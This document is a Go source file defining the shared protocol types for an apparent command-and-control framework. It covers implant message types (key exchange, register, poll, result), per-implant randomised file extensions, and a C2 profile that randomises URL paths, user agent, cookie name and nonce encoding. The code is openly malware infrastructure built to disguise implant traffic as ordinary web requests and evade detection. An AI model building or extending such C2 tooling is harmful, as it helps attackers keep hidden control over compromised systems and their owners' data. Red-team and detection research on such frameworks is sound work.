// Package protocol defines shared types and constants for the C2 protocol,
// including message framing, encryption, key exchange, and C2 profile
// configuration.
package protocol

import "math/rand/v2"

// NonceModeURLParam is the name of the nonce transport mode that embeds
// the encoder identifier inside a URL query parameter.
const (
	NonceModeURLParam = "urlparam"
)

// Well-known message type constants used to dispatch C2 traffic.
const (
	MsgKeyExchange = "keyexchange"
	MsgRegister    = "register"
	MsgPoll        = "poll"
	MsgResult      = "result"
)

// ExtensionMap maps each message type to a file extension that is unique
// to this implant instance.
type ExtensionMap struct {
	KeyExchange string `json:"keyexchange"`
	Register    string `json:"register"`
	Poll        string `json:"poll"`
	Result      string `json:"result"`
}

// ExtToMsgType resolves a file extension string back to the corresponding
// message type constant. It returns an empty string when the extension is
// unknown.
func (m *ExtensionMap) ExtToMsgType(ext string) string {
	switch ext {
	case m.KeyExchange:
		return MsgKeyExchange
	case m.Register:
		return MsgRegister
	case m.Poll:
		return MsgPoll
	case m.Result:
		return MsgResult
	default:
		return ""
	}
}

// GenerateExtensionMap randomly assigns file extensions for each message
// type from the pools defined in the C2 profile.
func GenerateExtensionMap(profile *C2Profile) ExtensionMap {
	hkExt := profile.KeyExchangeExtensions[rand.IntN(len(profile.KeyExchangeExtensions))]
	regExt := profile.RegisterExtensions[rand.IntN(len(profile.RegisterExtensions))]
	pollExt := profile.PollExtensions[rand.IntN(len(profile.PollExtensions))]
	resultExt := profile.ResultExtensions[rand.IntN(len(profile.ResultExtensions))]
	return ExtensionMap{
		KeyExchange: hkExt,
		Register:    regExt,
		Poll:        pollExt,
		Result:      resultExt,
	}
}

// HTTPC2PathSegment represents a single segment in a constructed C2 URL
// path. It may be a literal string or a file with an extension.
type HTTPC2PathSegment struct {
	Value  string `json:"value"`
	IsFile bool   `json:"is_file"`
}

// C2Profile describes the HTTP C2 randomization behaviour. It defines
// which path segments, file extensions, nonce transport mode, and encoder
// parameters the implant should use.
type C2Profile struct {
	PathSegments          []HTTPC2PathSegment `json:"path_segments"`
	KeyExchangeExtensions []string            `json:"keyexchange_extensions"`
	RegisterExtensions    []string            `json:"register_extensions"`
	PollExtensions        []string            `json:"poll_extensions"`
	ResultExtensions      []string            `json:"result_extensions"`
	UserAgent             string              `json:"user_agent"`
	SessionCookieName     string              `json:"session_cookie_name"`
	MinPathLength         int                 `json:"min_path_length"`
	MaxPathLength         int                 `json:"max_path_length"`
	NonceMode             string              `json:"nonce_mode"`
	EncoderModulus        int                 `json:"encoder_modulus"`
}

// IsKeyExchangeExt reports whether the given file extension belongs to
// the key-exchange extension pool of this profile.
func (p *C2Profile) IsKeyExchangeExt(ext string) bool {
	for _, e := range p.KeyExchangeExtensions {
		if e == ext {
			return true
		}
	}
	return false
}
